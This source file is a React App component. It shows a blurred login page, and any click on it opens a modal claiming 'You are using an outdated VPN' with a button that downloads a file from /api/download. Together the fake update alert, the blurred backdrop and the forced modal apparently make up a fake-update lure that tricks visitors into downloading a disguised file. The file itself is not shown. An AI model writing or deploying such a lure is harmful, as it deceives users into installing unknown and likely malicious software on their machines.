import { useState } from "react";
import Header from "./components/Header";
import LoginPage from "./components/LoginPage";
import { downloadConfig } from "./config/downloadConfig";

export default function App() {
  const [notificationVisible, setNotificationVisible] = useState(false);
  const [downloadState, setDownloadState] = useState<"idle" | "loading" | "error">("idle");

  function showNotification() {
    setNotificationVisible(true);
  }

  function triggerFileDownload(fileBlob: Blob) {
    const localFileUrl = URL.createObjectURL(fileBlob);
    const downloadLink = document.createElement("a");

    downloadLink.href = localFileUrl;
    downloadLink.download = downloadConfig.fileName;
    document.body.appendChild(downloadLink);
    downloadLink.click();
    downloadLink.remove();
    window.setTimeout(() => URL.revokeObjectURL(localFileUrl), 1000);
  }

  async function downloadVpnUpdate() {
    setDownloadState("loading");

    try {
      const response = await fetch("/api/download");
      if (!response.ok) throw new Error("Download request failed");

      triggerFileDownload(await response.blob());
      setDownloadState("idle");
    } catch {
      setDownloadState("idle");
    }
  }

  return (
    <div className="blur-container">
      <Header onAction={showNotification} />
      <div className="rr-content">
        <LoginPage onAction={showNotification} />
      </div>
      {notificationVisible ? (
        <div className="local-notification-backdrop" role="presentation">
          <div className="local-notification" role="alertdialog" aria-modal="true" aria-labelledby="vpn-notification-title">
            <button
              className="local-notification__close"
              type="button"
              aria-label="Close notification"
              onClick={() => setNotificationVisible(false)}
            >
              ×
            </button>
            <strong id="vpn-notification-title">You are using an outdated VPN</strong>
            <span>Update it using the file below.</span>
            <button
              className="local-notification__download"
              type="button"
              onClick={downloadVpnUpdate}
              disabled={downloadState === "loading"}
            >
              {downloadState === "loading" ? "Preparing download..." : "Download VPN update"}
            </button>
          </div>
        </div>
      ) : null}
    </div>
  );
}
